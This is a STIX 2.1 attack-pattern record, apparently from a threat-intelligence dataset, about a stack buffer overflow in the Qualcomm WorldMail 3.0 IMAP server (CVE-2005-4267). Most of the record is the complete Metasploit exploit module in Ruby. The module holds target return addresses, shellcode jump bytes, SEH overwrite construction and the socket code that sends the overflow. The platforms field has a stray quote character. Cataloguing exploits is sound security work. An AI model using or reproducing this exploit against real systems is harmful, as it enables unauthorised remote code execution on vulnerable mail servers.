{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14944702-bf9d-473e-b2b0-68a860dbaa8d",
    "created": "2024-08-14T16:47:31.756745Z",
    "modified": "2024-08-14T16:47:31.756749Z",
    "name": "Qualcomm WorldMail 3.0 IMAPD LIST Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Qualcomm WorldMail IMAP Server version 3.0 (builds 6.1.19.0 through 6.1.22.0). Version 6.1.22.1 fixes this particular vulnerability.  NOTE: The service does NOT restart automatically by default. You may be limited to only one attempt, so choose wisely! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/eudora_list.rb",
            "external_id": "eudora_list.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4267"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Imap\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Qualcomm WorldMail 3.0 IMAPD LIST Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the Qualcomm WorldMail IMAP Server\n        version 3.0 (builds 6.1.19.0 through 6.1.22.0). Version 6.1.22.1 fixes this\n        particular vulnerability.\n\n        NOTE: The service does NOT restart automatically by default. You may be limited to\n        only one attempt, so choose wisely!\n      },\n      'Author'         => [ 'MC', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-4267'],\n          [ 'OSVDB', '22097'],\n          [ 'BID', '15980'],\n\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x7b\",\n          'StackAdustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'WorldMail 3 Version 6.1.19.0',   { 'Ret' => 0x600b6317 } ], # p/p/r in MLstMgr.dll v6.1.19.0\n          [ 'WorldMail 3 Version 6.1.20.0',   { 'Ret' => 0x10022187 } ], # p/p/r in msremote.dll ?\n          [ 'WorldMail 3 Version 6.1.22.0',   { 'Ret' => 0x10022187 } ], # p/p/r in MsRemote.dll v6.1.22.0\n        ],\n      'DisclosureDate' => '2005-12-20',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    targ = auto_target\n    disconnect\n\n    return Exploit::CheckCode::Appears if (targ)\n    return Exploit::CheckCode::Safe\n  end\n\n  def auto_target\n    connect\n\n    if (banner and banner =~ /WorldMail/ and banner =~ /IMAP4 Server (.*) ready/)\n      version = $1\n      ver = version.split('.')\n      if (ver.length == 4)\n        major = ver[0].to_i\n        minor = ver[1].to_i\n        rev = ver[2].to_i\n        build = ver[3].to_i\n        if (major == 6 and minor == 1)\n          return targets[1] if (rev == 19)\n          return targets[2] if (rev == 20)\n          return targets[3] if (rev == 22)\n        end\n      end\n    end\n\n    # no target found\n    nil\n  end\n\n  def exploit\n    if (target_index == 0)\n      mytarget = auto_target\n      if mytarget\n        print_status(\"Automatically detected \\\"#{mytarget.name}\\\" ...\")\n      else\n        fail_with(Failure::NoTarget, 'Unable to automatically detect a target')\n      end\n    else\n      mytarget = target\n      connect\n    end\n\n    jmp =  \"\\x6a\\x05\\x59\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x2f\\x77\\x28\"\n    jmp << \"\\x4b\\x83\\xeb\\xfc\\xe2\\xf4\\xf6\\x99\\xf1\\x3f\\x0b\\x83\\x71\\xcb\\xee\\x7d\"\n    jmp << \"\\xb8\\xb5\\xe2\\x89\\xe5\\xb5\\xe2\\x88\\xc9\\x4b\"\n\n    sploit =  \"a001 LIST \" + rand_text_alphanumeric(20)\n    sploit << payload.encoded\n    sploit << generate_seh_record(mytarget.ret)\n    sploit << make_nops(8) + jmp + rand_text_alphanumeric(40)\n    sploit << \"}\" + \"\\r\\n\"\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-12-20",
    "x_mitre_platforms": [
        "win'"
    ]
}